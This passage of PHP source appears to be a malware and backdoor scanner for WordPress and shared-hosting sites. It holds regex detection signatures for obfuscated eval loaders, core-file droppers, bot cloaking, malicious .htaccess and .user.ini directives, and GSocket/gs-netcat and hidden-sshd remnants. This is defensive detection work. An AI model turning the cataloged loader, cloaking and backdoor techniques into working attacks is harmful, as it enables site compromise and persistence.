            ['score' => 80, 'sig' => 'ua_preg_bot', 'pat' => '/preg_match\s*\(.{0,100}(googlebot|bingbot|bot|spider|crawl).{0,100}HTTP_USER_AGENT/si'],
            ['score' => 90, 'sig' => 'bot_redirect_cloak', 'pat' => '/(googlebot|bingbot|spider|crawl).{0,500}header\s*\(\s*[\'"]Location/si'],
            ['score' => 90, 'sig' => 'bot_content_swap', 'pat' => '/(googlebot|bingbot|spider|crawl).{0,500}(file_get_contents|curl_exec|wp_remote_get)\s*\(/si'],
            // ── Missed detection fixes ──
            ['score' => 100, 'sig' => 'eval_gzdecode', 'pat' => '/eval\s*\(\s*@?gzdecode\s*\(/i'],
            ['score' => 100, 'sig' => 'eval_uudecode', 'pat' => '/eval\s*\(\s*convert_uudecode\s*\(/i'],
            ['score' => 80, 'sig' => 'uudecode_payload', 'pat' => '/convert_uudecode\s*\(\s*[\'"][^\'"]{100,}/si'],
            ['score' => 90, 'sig' => 'eval_rawurldecode', 'pat' => '/eval\s*\(\s*rawurldecode\s*\(/i'],
            ['score' => 40, 'sig' => 'has_gzdecode', 'pat' => '/\bgzdecode\s*\(/i'],
            ['score' => 80, 'sig' => 'chained_decode_include', 'pat' => '/(gzinflate|gzdecode|gzuncompress|base64_decode)\s*\(.{0,300}(include|require)/si'],
            ['score' => 100, 'sig' => 'wp_core_dropper', 'pat' => '/file_put_contents\s*\(.{0,100}(wp-config|wp-login|wp-settings|wp-load)\.php/si'],
        ];
        $RISK_THRESHOLD = 100;

        $calcEntropy = function ($str) {
            $len = strlen($str);
            if ($len < 100)
                return 0;
            $freq = array_count_values(str_split($str));
            $e = 0.0;
            foreach ($freq as $cnt) {
                $p = $cnt / $len;
                $e -= $p * log($p, 2);
            }
            return $e;
        };
        $findLargeB64Blob = function ($c) {
            return preg_match('/[A-Za-z0-9+\/]{500,}={0,2}/', $c, $m) ? $m[0] : '';
        };


        $_wlFile2 = __DIR__ . '/.shield_whitelist.json';
        $_whitelist2 = file_exists($_wlFile2) ? json_decode(@file_get_contents($_wlFile2), true) : [];
        if (!is_array($_whitelist2)) $_whitelist2 = [];
        $scanFile = function ($c, $fp, $sz, $dom) use ($scoredSigs, $RISK_THRESHOLD, $calcEntropy, $findLargeB64Blob, $_whitelist2) {
            $realFp = shield_norm_path(realpath($fp) ?: $fp);
            $selfFile = shield_norm_path(realpath(__FILE__) ?: __FILE__);
            if ($realFp === $selfFile)
                return null;
            if (shield_is_benign_php_placeholder($fp, $c, $sz))
                return null;
            $totalScore = 0;
            $hitSigs = [];
            $topSig = '';
            foreach ($scoredSigs as $s) {
                if (@preg_match($s['pat'], $c)) {
                    $totalScore += $s['score'];
                    $hitSigs[] = $s['sig'];
                    if (!$topSig)
                        $topSig = $s['sig'];
                    if ($totalScore >= 300)
                        break;
                }
            }
            shield_apply_normalized_scan($c, $fp, $totalScore, $hitSigs, $topSig);
            shield_apply_decoded_payload_scan($c, $scoredSigs, $totalScore, $hitSigs, $topSig);
            if (preg_match('#/mu-plugins/[^/]+\.php$#', $fp) && !preg_match('#/mu-plugins/index\.php$#', $fp)) {
                $totalScore += 60;
                $hitSigs[] = 'mu_plugin_file';
                if (!$topSig)
                    $topSig = 'mu_plugin_file';
            }
            if (preg_match('#/(?:js|css|assets|images|fonts|media|static)(?:/|$).*\.php$#', $fp) && $sz > 100) {
                $totalScore += 70;
                $hitSigs[] = 'php_in_nonphp_dir';
                if (!$topSig)
                    $topSig = 'php_in_nonphp_dir';
            }
            if (preg_match('#/(?:languages|i18n|lang)(?:/|$).*\.php$#', $fp) && !preg_match('/\.l10n\.php$/', $fp) && $sz > 500) {
                $totalScore += 50;
                $hitSigs[] = 'php_in_lang_dir';
                if (!$topSig)
                    $topSig = 'php_in_lang_dir';
            }
            // PHP in uploads dir — tidak boleh ada sama sekali
            if (preg_match('#/(?:uploads?|userfiles|user-files)(?:/|$).*\.(?:php[0-9]?|phtml|phar)$#i', $fp)) {
                $totalScore += 100;
                $hitSigs[] = 'php_in_uploads';
                if (!$topSig)
                    $topSig = 'php_in_uploads';
            }
            // PHP in tmp/temp/cache dirs
            if (preg_match('#/(?:tmp|temp|cache|sessions?|logs?|backup|bak)(?:/|$).*\.(?:php[0-9]?|phtml|phar|phps)$#i', $fp)) {
                $totalScore += 100;
                $hitSigs[] = 'php_in_temp_dir';
                if (!$topSig)
                    $topSig = 'php_in_temp_dir';
            }
            // Double/triple extension
            if (preg_match('/\.\w{2,4}\.(php[0-9]?|phtml|phar)$/i', $fp)) {
                $totalScore += 100;
                $hitSigs[] = 'multi_ext_php';
                if (!$topSig)
                    $topSig = 'multi_ext_php';
            }
            // Alternative PHP extension (phtml/php5/php7/phar)
            if (preg_match('/\.(phtml|php5|php7|phar)$/i', $fp)) {
                $totalScore += 70;
                $hitSigs[] = 'alt_php_ext';
                if (!$topSig)
                    $topSig = 'alt_php_ext';
            }
            // Timestamp-pattern filename: t_UNIX_COUNTER.ext — mass-deploy shell pattern
            if (preg_match('/\/t_\d{9,13}_\d{1,4}\.(?:php[0-9]?|phtml|phar)$/i', $fp)) {
                $totalScore += 200;
                $hitSigs[] = 'timestamp_filename';
                if (!$topSig)
                    $topSig = 'timestamp_filename';
            }
            if ($totalScore < $RISK_THRESHOLD && $sz < 200 * 1024) {
                $blob = $findLargeB64Blob($c);
                $entropy = $blob !== '' ? $calcEntropy(substr($blob, 0, 8000)) : 0;
                if ($entropy > 5.4) {
                    $totalScore += 60;
                    $hitSigs[] = 'high_entropy_blob';
                    if (!$topSig)
                        $topSig = 'high_entropy_blob';
                }
            }
            shield_apply_false_positive_suppression($c, $fp, $sz, $totalScore, $hitSigs, $topSig);
            $normFp = shield_norm_path($fp);
            $wlFiltered = [];
            foreach ($_whitelist2 as $wl) {
                if (isset($wl['size']) && $wl['size'] > 0 && $wl['size'] !== $sz) continue;
                $wlType = $wl['type'] ?? '';
                if ($wlType === 'path' && isset($wl['path']) && shield_norm_path($wl['path']) === $normFp) {
                    if (!empty($wl['sig'])) { $wlFiltered[] = $wl['sig']; } else { $totalScore = 0; $hitSigs = []; $topSig = ''; break; }
                } elseif ($wlType === 'dir' && isset($wl['dir']) && strpos($normFp, rtrim($wl['dir'], '/') . '/') === 0) {
                    if (!empty($wl['sig'])) { $wlFiltered[] = $wl['sig']; } else { $totalScore = 0; $hitSigs = []; $topSig = ''; break; }
                } elseif ($wlType === 'sig' && isset($wl['sig'])) {
                    $wlFiltered[] = $wl['sig'];
                }
            }
            foreach ($wlFiltered as $wlSig) {
                $idx = array_search($wlSig, $hitSigs, true);
                if ($idx !== false) {
                    unset($hitSigs[$idx]); $hitSigs = array_values($hitSigs);
                    foreach ($scoredSigs as $s) { if ($s['sig'] === $wlSig) { $totalScore = max(0, $totalScore - $s['score']); break; } }
                    if ($topSig === $wlSig) $topSig = $hitSigs[0] ?? '';
                }
            }
            if ($totalScore < $RISK_THRESHOLD)
                return null;
            $sigLabel = count($hitSigs) > 1 ? $topSig . ' (+' . (count($hitSigs) - 1) . ')' : $topSig;
            return [
                'domain' => $dom,
                'sig' => $sigLabel,
                'sigs' => $hitSigs,
                'score' => $totalScore,
                'path' => $fp,
                'size' => $sz,
                'mod' => date('Y-m-d H:i', filemtime($fp)),
            ];
        };

        // ── Build roots (sama persis) ──
        $roots = [];
        $dd = "$home/domains";
        if (is_dir($dd)) {
            foreach (scandir($dd) as $d) {
                if ($d === '.' || $d === '..')
                    continue;
                foreach (['public_html', 'html', 'www', 'htdocs', 'web'] as $wr) {
                    $candidate = "$dd/$d/$wr";
                    if (is_dir($candidate)) {
                        $roots[$d] = $candidate;
                        break;
                    }
                }
            }
        }
        if (is_dir("$home/public_html")) {
            $mainHost = strtolower(preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? ''));
            $roots[$mainHost ?: 'main'] = "$home/public_html";
        }
        if (empty($roots) && is_dir("$home/htdocs")) {
            $htdocsDir = "$home/htdocs";
            $mh = strtolower(preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? ''));
            if (file_exists("$htdocsDir/index.php") || file_exists("$htdocsDir/wp-config.php") || file_exists("$htdocsDir/configuration.php")) {
                $roots[$mh ?: 'main'] = $htdocsDir;
            } else {
                foreach (scandir($htdocsDir) as $d) {
                    if ($d === '.' || $d === '..' || !is_dir("$htdocsDir/$d"))
                        continue;
                    if (in_array($d, ['logs', 'htaccess-backup', 'leer', 'vmfiles']))
                        continue;
                    $roots[$d] = "$htdocsDir/$d";
                }
            }
        }
        if (empty($roots) && is_dir("$home/httpdocs")) {
            $mainHost = strtolower(preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? ''));
            $roots[$mainHost ?: 'main'] = "$home/httpdocs";
        }
        if (empty($roots) && is_dir('/var/www')) {
            foreach (scandir('/var/www') as $d) {
                if ($d === '.' || $d === '..' || !is_dir("/var/www/$d"))
                    continue;
                if (in_array($d, ['html', 'logs', 'cache', 'vhosts', 'cgi-bin']))
                    continue;
                if (strpos($d, '.') !== false) {
                    $pub = "/var/www/$d/public_html";
                    $htdocs = "/var/www/$d/htdocs";
                    $web = "/var/www/$d/web";
                    if (is_dir($pub))
                        $roots[$d] = $pub;
                    elseif (is_dir($htdocs))
                        $roots[$d] = $htdocs;
                    elseif (is_dir($web))
                        $roots[$d] = $web;
                    else
                        $roots[$d] = "/var/www/$d";
                }
            }
        }
        if (empty($roots) && is_dir('/var/www/vhosts')) {
            foreach (scandir('/var/www/vhosts') as $d) {
                if ($d === '.' || $d === '..' || !is_dir("/var/www/vhosts/$d"))
                    continue;
                if (strpos($d, '.') !== false) {
                    $htdocs = "/var/www/vhosts/$d/httpdocs";
                    $pub = "/var/www/vhosts/$d/public_html";
                    if (is_dir($htdocs))
                        $roots[$d] = $htdocs;
                    elseif (is_dir($pub))
                        $roots[$d] = $pub;
                    else
                        $roots[$d] = "/var/www/vhosts/$d";
                }
            }
        }
        if (empty($roots) && is_dir('/var/www/html')) {
            $mainHost = strtolower(preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? ''));
            $roots[$mainHost ?: 'main'] = '/var/www/html';
        }
        // ISPmanager/Beget/TimeWeb (RU hosting): /var/www/user/data/www/domain.com/
        if (is_dir("$home/www")) {
            foreach (scandir("$home/www") as $d) {
                if ($d === '.' || $d === '..')
                    continue;
                $wp = "$home/www/$d";
                if (is_dir($wp) && strpos($d, '.') !== false && !isset($roots[$d]))
                    $roots[$d] = $wp;
            }
        }
        if (empty($roots)) {
            $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
            if ($docRoot && is_dir($docRoot)) {
                $mainHost = strtolower(preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? ''));
                $roots[$mainHost ?: 'main'] = $docRoot;
            }
        }
        $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
        if ($docRoot && is_dir($docRoot)) {
            $alreadyCovered = false;
            foreach ($roots as $rx) {
                // Only covered if existing root is a parent of or equal to docRoot.
                // If existing root is a CHILD of docRoot, root-level files are still unscanned.
                if (strpos($docRoot, $rx) === 0) {
                    $alreadyCovered = true;
                    break;
                }
            }
            if (!$alreadyCovered) {
                $mainHost = strtolower(preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? ''));
                $roots[$mainHost ?: 'docroot'] = $docRoot;
            }
        }
        if (!empty($_POST['scan_domain'])) {
            $sd = trim($_POST['scan_domain']);
            if (isset($roots[$sd]))
                $roots = [$sd => $roots[$sd]];
        }
        if (!empty($_POST['scan_path'])) {
            $cp = realpath(trim($_POST['scan_path']));
            $allowedBases = array_filter(array_map('realpath', [$home, $_SERVER['DOCUMENT_ROOT'] ?? '']), 'strlen');
            $pathOk = false;
            foreach ($allowedBases as $base) {
                if ($base && strpos($cp . '/', $base . '/') === 0) {
                    $pathOk = true;
                    break;
                }
            }
            if ($cp && is_dir($cp) && $pathOk) {
                // Fix chmod 111/555 evasion — restore read bits so iterator can list files
                if (!is_readable($cp)) @chmod($cp, @fileperms($cp) | 0444);
                $roots = ['custom' => $cp];
            }
        }

        $skipDirNames = ['node_modules', '.git', 'bower_components', 'ai1wm-backups', 'upgrade-temp-backup', '.sass-cache'];
        $knownLegitPaths = ['/wordfence/lib/', '/wp-file-manager/lib/php/', '/wp-includes/html-api/', '/wp-includes/blocks/', '/wp-includes/sodium_compat/', '/wp-includes/ID3/', '/wp-includes/IXR/', '/wp-includes/Requests/', '/wp-includes/SimplePie/', '/phpmailer/src/', '/easy-wp-smtp/vendor/', '/wp-mail-smtp/vendor/', '/woocommerce/packages/', '/gravityforms/includes/'];
        $skipCoreIncludes = ['formatting.php', 'functions.php', 'class-wp-hook.php', 'post.php', 'query.php', 'taxonomy.php', 'user.php', 'meta.php', 'kses.php', 'l10n.php', 'pluggable.php', 'template.php', 'deprecated.php', 'comment.php', 'bookmark.php', 'canonical.php', 'capabilities.php', 'class-walker-nav-menu.php', 'class-wp-query.php', 'class-wp-rewrite.php', 'class-wp-user.php', 'date.php', 'default-filters.php', 'embed.php', 'feed.php', 'general-template.php', 'http.php', 'link-template.php', 'media.php', 'nav-menus.php', 'option.php', 'plugin.php', 'post-formats.php', 'post-template.php', 'rest-api.php', 'revision.php', 'rewrite.php', 'script-loader.php', 'shortcodes.php', 'theme.php', 'update.php', 'vars.php', 'widgets.php', 'compat-utf8.php', 'class-wp-http-encoding.php', 'class-wp-list-table.php', 'class-wp-roles.php', 'class-wp-session-tokens.php', 'class-wp-walker.php', 'class-wp-widget.php', 'class-wp-widget-factory.php', 'class-wp-site-health.php', 'class-wp-fatal-error-handler.php', 'sodium_compat.php', 'class-wp-html-processor.php', 'class-wp-block-processor.php', 'class-wp-html-tag-processor.php', 'class-wp-html-open-elements.php', 'class-wp-html-active-formatting-elements.php'];

        $shouldSkipScanDir = function ($path, $name) use ($skipDirNames) {
            $path = str_replace('\\', '/', $path);
            if (in_array($name, $skipDirNames, true))
                return true;
            return false;
        };

        // PHP files that legitimately live in the WordPress document root
        $knownWpRootFiles = [
            'index.php', 'wp-config.php', 'wp-config-sample.php', 'wp-login.php',
            'wp-cron.php', 'wp-signup.php', 'wp-mail.php', 'wp-comments-post.php',
            'wp-links-opml.php', 'wp-trackback.php', 'wp-activate.php', 'wp-blog-header.php',
            'wp-load.php', 'wp-settings.php', 'xmlrpc.php',
        ];
        $MAX_FILES = shield_scan_max_files();
        $scanStarted = microtime(true);
        $threatCount = 0;
        $filesScanned = [];

        $streamLine(['type' => 'start', 'domains' => count($roots), 'roots' => array_keys($roots), 'ts' => date('H:i:s')]);

        foreach ($roots as $dom => $root) {
            if (!is_dir($root))
                continue;
            // Pre-pass: fix chmod 111/555 evasion on custom paths (recursively restore read bits)
            if ($dom === 'custom') {
                $fixReadPerms2 = function($d, $dep = 0) use (&$fixReadPerms2) {
                    if ($dep > 8 || !is_dir($d)) return;
                    if (!is_readable($d)) @chmod($d, @fileperms($d) | 0444);
                    if (!is_readable($d)) return;
                    foreach (@scandir($d) ?: [] as $e) {
                        if ($e === '.' || $e === '..') continue;
                        $p = "$d/$e";
                        if (is_dir($p) && !is_readable($p)) $fixReadPerms2($p, $dep + 1);
                    }
                };
                $fixReadPerms2($root);
            }
            $fileCount = 0;
            $lastProgress = microtime(true);
            try {
                $dirIterator = new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS);
                if (class_exists('RecursiveCallbackFilterIterator')) {
                    $dirIterator = new RecursiveCallbackFilterIterator($dirIterator, function ($current) use ($shouldSkipScanDir) {
                        if ($current->isDir() && $shouldSkipScanDir($current->getPathname(), $current->getFilename()))
                            return false;
                        return true;
                    });
                }
                $rit = new RecursiveIteratorIterator($dirIterator, RecursiveIteratorIterator::LEAVES_ONLY, RecursiveIteratorIterator::CATCH_GET_CHILD);
                $rit->setMaxDepth(35);
                foreach ($rit as $fileInfo) {
                    if ($fileCount >= $MAX_FILES)
                        break;
                    if (!$fileInfo->isFile())
                        continue;
                    $ext = strtolower($fileInfo->getExtension());
                    $fname = $fileInfo->getFilename();
                    $isPhpAlt = in_array($ext, ['phtml', 'php5', 'php7', 'phar', 'phps']);
                    $isHtaccess = ($fname === '.htaccess');
                    $isUserIni = ($fname === '.user.ini');
                    if ($ext !== 'php' && !$isPhpAlt && !$isHtaccess && !$isUserIni)
                        continue;
                    $sz = $fileInfo->getSize();
                    if ($sz > 3 * 1024 * 1024)
                        continue;
                    $fp = str_replace('\\', '/', $fileInfo->getPathname());
                    // .htaccess + .user.ini — scan for malicious directives
                    if ($isHtaccess || $fname === '.user.ini') {
                        $hc = @file_get_contents($fp);
                        if ($hc) {
                            if ($isHtaccess) {
                                $htChecks = [
                                    ['sig' => 'htaccess_php_type', 'pat' => '/AddType\s+(?:application\/x-httpd-php|x-httpd-php)[^\n]*\.(jpg|jpeg|png|gif|css|js|txt|svg|ico)/i'],
                                    ['sig' => 'htaccess_cloak_marker', 'pat' => '/(?:CLOAK\s+START|CLOAK\s+END)/i'],
                                    ['sig' => 'htaccess_bot_ua_env', 'pat' => '/SetEnvIfNoCase\s+User-Agent[^\n]+(?:Google|Googlebot|bingbot|YandexBot|crawl|spider|bot)/i'],
                                    ['sig' => 'htaccess_bot_rewrite', 'pat' => '/RewriteCond\s+%\{ENV:is_(?:google_bot|bot|spider|crawler)\}/i'],
                                    ['sig' => 'htaccess_prepend', 'pat' => '/php_value\s+auto_(?:prepend|append)_file/i'],
                                    ['sig' => 'htaccess_sethandler', 'pat' => '/SetHandler\s+application\/x-httpd-php/i'],
                                    ['sig' => 'htaccess_append', 'pat' => '/php_value\s+auto_append_file/i'],
                                    ['sig' => 'htaccess_cgi_handler', 'pat' => '/Action\s+application\/x-httpd-php/i'],
                                    ['sig' => 'htaccess_rewrite_php', 'pat' => '/RewriteRule\s+.*\.(jpg|png|gif|ico|txt)\s+.*\.php/i'],
                                ];
                                $htHits = [];
                                foreach ($htChecks as $hk) {
                                    if (@preg_match($hk['pat'], $hc))
                                        $htHits[] = $hk['sig'];
                                }
                                if (!empty($htHits)) {
                                    $threatCount++;
                                    $streamLine(['type' => 'threat', 'threat' => ['domain' => $dom, 'sig' => $htHits[0] . (count($htHits) > 1 ? ' (+' . (count($htHits) - 1) . ')' : ''), 'sigs' => $htHits, 'score' => 200, 'path' => $fp, 'size' => $sz, 'mod' => date('Y-m-d H:i', filemtime($fp))], 'count' => $threatCount]);
                                }
                            } else {
                                if (preg_match('/^\s*auto_prepend_file\s*=/mi', $hc) || preg_match('/^\s*auto_append_file\s*=/mi', $hc)) {
                                    $threatCount++;
                                    $streamLine(['type' => 'threat', 'threat' => ['domain' => $dom, 'sig' => 'userini_prepend', 'sigs' => ['userini_prepend'], 'score' => 200, 'path' => $fp, 'size' => $sz, 'mod' => date('Y-m-d H:i', filemtime($fp))], 'count' => $threatCount]);
                                }
                            }
                        }
                        $fileCount++;
                        continue;
                    }
                    $skip = false;
                    foreach ($skipDirNames as $sd2) {
                        if (strpos($fp, '/' . $sd2 . '/') !== false) {
                            $skip = true;
                            break;
                        }
                    }
                    if ($skip)
                        continue;
                    // Known library paths are scanned; generic-only hits are suppressed after content analysis.
                    if (strpos($fp, '/wp-includes/') !== false) {
                        if (in_array($fileInfo->getFilename(), $skipCoreIncludes))
                            continue;
                    }
                    // Zero-byte PHP
                    if ($sz === 0) {
                        $sensitivePaths = ['/wp-admin/', '/wp-includes/', '/wp-content/upgrade/', '/wp-content/plugins/', '/wp-content/themes/'];
                        foreach ($sensitivePaths as $sp) {
                            if (strpos($fp, $sp) !== false) {
                                $threatCount++;
                                $streamLine(['type' => 'threat', 'threat' => ['domain' => $dom, 'sig' => 'zero_byte_marker', 'sigs' => ['zero_byte_marker'], 'score' => 80, 'path' => $fp, 'size' => 0, 'mod' => date('Y-m-d H:i', filemtime($fp))], 'count' => $threatCount]);
                                break;
                            }
                        }
                        $fileCount++;
                        continue;
                    }
                    $c = @file_get_contents($fp);
                    if ($c === false)
                        continue;
                    $fileCount++;
                    // PHAR binary detection — check header before regex
                    if ($sz > 500 && (strpos($c, '__HALT_COMPILER') !== false || substr($c, 0, 4) === "\x00\x00\x00\x00" || (substr($c, 0, 5) === '<?php' && strpos(substr($c, 0, 200), "\x00") !== false))) {
                        $threatCount++;
                        $streamLine(['type' => 'threat', 'threat' => ['domain' => $dom, 'sig' => 'phar_manifest', 'sigs' => ['phar_manifest'], 'score' => 100, 'path' => $fp, 'size' => $sz, 'mod' => date('Y-m-d H:i', filemtime($fp))], 'count' => $threatCount]);
                        continue;
                    }
                    $result = $scanFile($c, $fp, $sz, $dom);
                    // WP root foreign-file check — PHP directly in docroot that isn't a core WP file
                    $normRoot = rtrim(str_replace('\\', '/', $root), '/');
                    $normFp   = str_replace('\\', '/', $fp);
                    if (preg_match('/\.php[0-9]?$/i', $fp)
                        && dirname($normFp) === $normRoot
                        && file_exists("$normRoot/wp-config.php")) {
                        $fname = strtolower(basename($fp));
                        if (!in_array($fname, $knownWpRootFiles)) {
                            if ($result) {
                                if (!in_array('unknown_wp_root_php', $result['sigs'])) {
                                    $result['sigs'][] = 'unknown_wp_root_php';
                                    $result['score'] += 50;
                                    $result['sig'] = $result['sigs'][0] . ' (+' . (count($result['sigs']) - 1) . ')';
                                }
                            } else {
                                $result = [
                                    'domain' => $dom,
                                    'sig'    => 'unknown_wp_root_php',
                                    'sigs'   => ['unknown_wp_root_php'],
                                    'score'  => 100,
                                    'path'   => $fp,
                                    'size'   => $sz,
                                    'mod'    => date('Y-m-d H:i', filemtime($fp)),
                                    'note'   => 'PHP file di WP root — bukan file WP core yang dikenal',
                                ];
                            }
                        }
                    }
                    if ($result) {
                        $threatCount++;
                        $streamLine(['type' => 'threat', 'threat' => $result, 'count' => $threatCount]);
                    }
                    // Progress setiap 2 detik atau setiap 200 file
                    $now = microtime(true);
                    if ($fileCount % 200 === 0 || ($now - $lastProgress) > 2) {
                        $streamLine(['type' => 'progress', 'domain' => $dom, 'files' => $fileCount, 'threats' => $threatCount, 'elapsed' => round($now - $scanStarted, 1)]);
                        $lastProgress = $now;
                    }
                }
            } catch (Exception $e) { /* dir not accessible */
            }
            $filesScanned[$dom] = $fileCount;
            $streamLine(['type' => 'domain_done', 'domain' => $dom, 'files' => $fileCount, 'threats' => $threatCount]);
        }

        // ── POST-SCAN: PHP hidden di non-PHP files (uploads) ──
        $streamLine(['type' => 'progress', 'domain' => 'post-scan', 'files' => 0, 'threats' => $threatCount, 'elapsed' => round(microtime(true) - $scanStarted, 1), 'phase' => 'uploads_scan']);
        $suspectExts = ['jpg', 'jpeg', 'png', 'gif', 'ico', 'bmp', 'webp', 'avif', 'heic', 'svg', 'dat', 'log', 'txt', 'css', 'js', 'html', 'htm', 'shtml', 'xml', 'json', 'zip', 'tar', 'gz', 'bak', 'old', 'tmp', 'conf', 'ini'];
        $phpSigs = '/(<\?php|<\?=|<script\s+language\s*=\s*[\'"]?php|\beval\s*\(|base64_decode\s*\(|assert\s*\()/i';
        foreach ($roots as $dom => $root) {
            if (!is_dir($root))
                continue;
            $scanNonPhpDirs = [];
            foreach (['wp-content/uploads', 'wp-content/cache', 'wp-content/wflogs'] as $rel) {
                $p = "$root/$rel";
                if (is_dir($p))
                    $scanNonPhpDirs[] = $p;
            }
            foreach ($scanNonPhpDirs as $upDir) {
                try {
                    $upIt = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($upDir, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::LEAVES_ONLY
                    );
                    $upCount = 0;
                    foreach ($upIt as $fi) {
                        if ($upCount >= 8000)
                            break;
                        if (!$fi->isFile())
                            continue;
                        $ext = strtolower($fi->getExtension());
                        if (!in_array($ext, $suspectExts))
                            continue;
                        $sz = $fi->getSize();
                        if ($sz < 10 || $sz > 8 * 1024 * 1024)
                            continue;
                        $snippet = shield_read_file_edges($fi->getPathname());
                        if ($snippet === '') {
                            $upCount++;
                            continue;
                        }
                        if (@preg_match($phpSigs, $snippet)) {
                            $threatCount++;
                            $streamLine([
                                'type' => 'threat',
                                'threat' => [
                                    'domain' => $dom,
                                    'sig' => 'php_in_' . $ext . '_file',
                                    'sigs' => ['php_hidden_in_nonphp'],
                                    'score' => 100,
                                    'path' => str_replace('\\', '/', $fi->getPathname()),
                                    'size' => $sz,
                                    'mod' => date('Y-m-d H:i', filemtime($fi->getPathname())),
                                ],
                                'count' => $threatCount
                            ]);
                        }
                        $upCount++;
                    }
                } catch (Exception $e) {
                }
            }
        }

        $streamLine(['type' => 'done', 'total' => $threatCount, 'domains' => count($roots), 'files_scanned' => $filesScanned, 'scan_seconds' => round(microtime(true) - $scanStarted, 2)]);
        exit;

    } elseif ($api === 'scan_backdoors') {
        $dirs = [
            '.config/htop', '.config/Thunar', '.config/gs', '.config/.cache', '.config/pulse', '.config/dconf',
            '.local/share/.cache', '.local/share/gnome-shell', '.ssh/putty',
            // Additional known hiding spots (bitninjad-kernel pattern)
            '.softaculous/htop', '.softaculous/gs', '.softaculous/cache',
            '.npm', '.java', '.mozilla/htop', '.local/bin',
        ];
        $found = [];
        $scanHome = $home;
        if (function_exists('posix_getpwuid') && function_exists('posix_getuid')) {
            $pw = @posix_getpwuid(posix_getuid());
            if ($pw && !empty($pw['dir']) && is_dir($pw['dir'])) $scanHome = $pw['dir'];
        }
        if ($scanHome === $home) {
            $envHome = getenv('HOME');
            if ($envHome && $envHome !== '/tmp' && is_dir($envHome)) $scanHome = $envHome;
        }
        // Fix addon domain path: /home/user/domain.com/public_html parses to /home/user/domain.com
        // Strip the addon domain level to get the real home /home/user
        if (preg_match('#^(/home/[^/]+)/[^/]+$#', $scanHome, $m)) {
            $candidate = $m[1];
            if (is_dir($candidate) && (file_exists("$candidate/.bashrc") || file_exists("$candidate/.bash_profile") || is_dir("$candidate/public_html"))) {
                $scanHome = $candidate;
            }
        }
        // Scan system-wide temp dirs for ALL GSocket remnants
        foreach (['/dev/shm', '/tmp', '/var/tmp'] as $tmpDir) {
            if (!is_dir($tmpDir)) continue;
            try {
                foreach (scandir($tmpDir) as $tf) {
                    if ($tf === '.' || $tf === '..') continue;
                    $tp = "$tmpDir/$tf";
                    $dirBase = basename($tmpDir);
                    // GSocket temp directories (.gs-*, .gsusr-*)
                    if (is_dir($tp) && (strpos($tf, '.gs') === 0 || strpos($tf, '.gsusr') === 0)) {
                        $found[] = ['path' => $tp, 'size' => 0, 'type' => 'gsocket_tmpdir'];
                        continue;
                    }
                    if (!is_file($tp)) continue;
                    $sz = @filesize($tp);
                    // ELF binaries (hidden or not) — gs-netcat, defunct, .gs_XXXX
                    if ($sz > 1000) {
                        $hdr = @file_get_contents($tp, false, null, 0, 4);
                        if ($hdr === "\x7fELF") {
                            $found[] = ['path' => $tp, 'size' => $sz, 'type' => "ELF binary (in $dirBase/)"];
                            continue;
                        }
                    }
                    // GSocket secret key files: [kcached].dat, [writeback].dat, .defunct.dat, defunct.dat
                    if (preg_match('/\.(dat|ppk)$/', $tf) && $sz > 0 && $sz < 100) {
                        $dc = trim(@file_get_contents($tp));
                        if (preg_match('/^[A-Za-z0-9+\/=\-_]{16,}$/', $dc))
                            $found[] = ['path' => $tp, 'size' => $sz, 'type' => "gsocket_key (in $dirBase/)"];
                        continue;
                    }
                    // [hidden_name].dat with bracket names — gsocket installer naming
                    if (preg_match('/^\[.+\]\.dat$/', $tf)) {
                        $dc = $sz > 0 && $sz < 100 ? trim(@file_get_contents($tp)) : '';
                        $found[] = ['path' => $tp, 'size' => $sz, 'type' => "gsocket_key (in $dirBase/)"];
                        continue;
                    }
                    // Encoded binary backup (.defunct.cfg)
                    if (preg_match('/\.cfg$/', $tf) && $sz > 100000 && strpos($tf, 'defunct') !== false) {
                        $found[] = ['path' => $tp, 'size' => $sz, 'type' => "gsocket_encoded_backup (in $dirBase/)"];
                        continue;
                    }
                    // Watchdog/persistence scripts
                    if (preg_match('/watchdog|\.sh$/', $tf) && $sz > 0 && $sz < 10000) {
                        $sc = @file_get_contents($tp, false, null, 0, 200);
                        if ($sc && (stripos($sc, 'defunct') !== false || stripos($sc, 'gs-netcat') !== false || stripos($sc, 'gs-dbus') !== false || stripos($sc, 'pgrep') !== false))
                            $found[] = ['path' => $tp, 'size' => $sz, 'type' => "gsocket_watchdog (in $dirBase/)"];
                        continue;
                    }
                    // Hidden SSH daemon (.dbus-session/sshd pattern)
                    if (strpos($tf, '.dbus-session') !== false || strpos($tf, '.ssh-') !== false) {
                        $found[] = ['path' => $tp, 'size' => $sz, 'type' => "ssh_backdoor (in $dirBase/)"];
                        continue;
                    }
                }
                // Also check .dbus-session subdirectory for sshd binary
                $dbusDir = "$tmpDir/.dbus-session";
                if (is_dir($dbusDir)) {
                    foreach (scandir($dbusDir) as $df) {
                        if ($df === '.' || $df === '..') continue;
                        $dp = "$dbusDir/$df";
                        if (is_file($dp)) {
                            $found[] = ['path' => $dp, 'size' => @filesize($dp), 'type' => 'ssh_backdoor_binary (.dbus-session/)'];
                        }
                    }
                }
            } catch (\Exception $e) {}
        }
        foreach ($dirs as $rel) {
            $dir = "$scanHome/$rel";
            if (!is_dir($dir))
                continue;
            try {
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
                foreach ($it as $f) {
                    if (!$f->isFile())
                        continue;
                    $path = $f->getPathname();
                    $sz = $f->getSize();
                    $hdr = @file_get_contents($path, false, null, 0, 4);
                    $type = 'suspicious';
                    if ($hdr === "\x7fELF")
                        $type = 'ELF binary';
                    elseif ($sz <= 64 && $sz > 0) {
                        $c = @file_get_contents($path);
